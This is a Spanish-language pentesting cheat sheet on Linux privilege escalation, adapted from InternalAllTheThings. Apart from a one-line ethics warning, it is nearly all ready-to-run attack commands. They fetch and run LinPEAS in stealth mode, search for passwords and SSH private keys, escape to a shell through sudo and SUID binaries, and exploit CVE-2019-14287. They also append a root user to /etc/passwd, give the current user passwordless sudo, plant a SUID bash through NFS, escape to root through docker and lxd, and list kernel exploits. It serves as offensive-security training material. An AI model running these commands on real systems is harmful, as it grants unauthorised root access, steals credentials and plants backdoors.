---
tags:
  - post-explotacion
  - privesc
  - linux
  - pentesting
fuente: "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
licencia: MIT
---

# Escalada de Privilegios — Linux

> [!warning] Uso ético y autorizado. Ver [[📜 Fuentes y Licencias]].

---

## Herramientas automáticas

```bash
# LinPEAS (más completo)
curl -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
./linpeas.sh -a    # all checks
./linpeas.sh -s    # superfast stealth (nada en disco)

# LinEnum
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t

# linux-smart-enumeration
./lse.sh -l1   # interesante
./lse.sh -l2   # todo
```

---

## Búsqueda de credenciales

```bash
# Contraseñas en archivos
grep -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
find . -type f -exec grep -iI "PASSWORD" {} /dev/null \;

# Archivos editados recientemente
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"

# Claves SSH
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null

# Contraseñas viejas
cat /etc/security/opasswd

# Archivos de preseed (instalación desatendida)
grep -r "passwd" /var/log/installer/ 2>/dev/null
```

---

## SUDO

```bash
# Ver permisos sudo del usuario actual
sudo -l

# Escapar a shell si hay binario permitido (GTFOBins)
sudo vim -c '!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo nmap --interactive   # nmap antiguo

# LD_PRELOAD (si está en env_keep del sudoers)
# Compilar: gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <cualquier_binario>

# CVE-2019-14287 (sudo < 1.8.28)
# Requiere: (ALL, !root) ALL en sudoers
sudo -u#-1 /bin/bash
```

---

## SUID / Capabilities

```bash
# Buscar binarios SUID
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null

# Listar capabilities
/usr/bin/getcap -r /usr/bin 2>/dev/null

# Capability peligrosa: cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

> [!tip] GTFOBins
> [gtfobins.github.io](https://gtfobins.github.io) — lista completa de binarios explotables con SUID, sudo, capabilities.

---

## Cron jobs y tareas programadas

```bash
# Ver crons del sistema
cat /etc/crontab
ls -al /etc/cron*
crontab -l

# Ver crons de otros usuarios (requiere permisos)
ls /var/spool/cron/crontabs/

# Monitorear procesos en tiempo real (detectar crons)
./pspy64 -pf -i 1000

# Timers systemd
systemctl list-timers --all
```

---

## Archivos con permisos débiles

```bash
# Archivos escribibles por cualquier usuario
find / -writable ! -user $(whoami) -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null

# /etc/passwd escribible → agregar usuario root
openssl passwd -1 -salt hacker hacker
echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

# /etc/sudoers escribible
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

---

## NFS Root Squashing

```bash
# Verificar exports con no_root_squash
cat /etc/exports
showmount -e <IP>

# Montar y crear binario SUID
mkdir /tmp/nfs
mount -t nfs <IP>:/shared /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# Ejecutar en víctima
/tmp/nfs/bash -p   # -p mantiene uid=root
```

---

## Grupos peligrosos

```bash
# Verificar membresía
id

# Docker → root inmediato
docker run -it --rm -v /:/host ubuntu chroot /host /bin/bash

# LXD/LXC
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer dev disk source=/ path=/mnt/root recursive=true
lxc start mycontainer && lxc exec mycontainer /bin/sh
```

---

## Shared Libraries (hijacking)

```bash
# Ver librerías de un binario
ldd /opt/binary

# RPATH: si apunta a directorio escribible
readelf -d /opt/binary | grep RPATH
# Copiar librería maliciosa al directorio del RPATH
```

---

## Kernel Exploits

```bash
# Identificar versión
uname -a

# Buscar exploit
searchsploit linux kernel <versión>
```

| CVE | Descripción |
|-----|-------------|
| CVE-2022-0847 | DirtyPipe — kernel 5.8 < 5.16.11 |
| CVE-2016-5195 | DirtyCow — kernel ≤ 3.19.0-73.8 |
| CVE-2021-4034 | PwnKit — pkexec en todas las distros |
| CVE-2010-3904 | RDS — kernel ≤ 2.6.36-rc8 |

---

## Flujo de trabajo

```
1. linpeas.sh / pspy64    → panorama completo
2. sudo -l                → binarios explotables (GTFOBins)
3. find SUID + capabilities
4. Crons y timers         → scripts ejecutados como root
5. Archivos escribibles críticos (/etc/passwd, sudoers)
6. Grupos (docker, lxd)
7. uname -a → kernel exploits
```

---

## Referencias
- [[🗺️ MOC Ciberseguridad y Redes]]
- [[Escalada de Privilegios Windows]]
- [[Persistencia Post-Explotación]]
- [[Pivoting de Red]]
- Fuente: [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/) — MIT
